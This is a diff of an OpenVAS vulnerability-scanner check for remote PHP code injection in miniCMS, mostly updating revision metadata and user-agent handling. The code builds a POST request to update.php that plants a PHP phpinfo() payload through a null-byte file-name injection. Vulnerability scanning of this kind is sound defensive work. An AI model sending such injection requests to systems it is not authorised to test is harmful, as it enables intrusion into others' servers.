@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_minicms_51612.nasl 11072 2018-08-21 14:38:15Z asteins $
+# $Id: gb_minicms_51612.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # miniCMS Multiple Remote PHP Code Injection Vulnerabilities
 #
@@ -25,17 +25,17 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103399");
   script_bugtraq_id(51612);
-  script_version("$Revision: 11072 $");
+  script_version("$Revision: 11435 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_name("miniCMS Multiple Remote PHP Code Injection Vulnerabilities");
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51612");
   script_xref(name:"URL", value:"http://sourceforge.net/projects/mini-cms/files/mini-cms/");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-21 16:38:15 +0200 (Tue, 21 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-01-24 11:44:44 +0100 (Tue, 24 Jan 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -65,9 +65,12 @@ Likely none will be provided anymore. General solution options are to upgrade to
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
+useragent = get_http_user_agent();
+vtstring = get_vt_string( lowercase:TRUE );
 
 foreach dir( make_list_unique( "/minicms", "/cms", cgi_dirs( port:port ) ) ) {
 
@@ -77,15 +80,15 @@ foreach dir( make_list_unique( "/minicms", "/cms", cgi_dirs( port:port ) ) ) {
 
   if( buf =~ "This site is managed using.*MiniCMS" ) {
 
-    page = "openvas-" + rand() + ".php";
+    page = vtstring + "-" + rand() + ".php";
     ex = "title=1&metadata=1&area=content&content=<?php phpinfo();?>&page=" + page + "%00";
 
     len = strlen( ex );
     host = http_host_name( port:port );
 
-    req = string("POST ",dir,"/update.php HTTP/1.1\r\n",
-		 "Host: ",host,"\r\n",
-		 "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
+    req = string("POST ", dir, "/update.php HTTP/1.1\r\n",
+		 "Host: ", host, "\r\n",
+		 "User-Agent: ", useragent, "\r\n",
 		 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
 		 "Accept-Language: en-us,en;q=0.5\r\n",
 		 "Accept-Encoding: gzip, deflate\r\n",
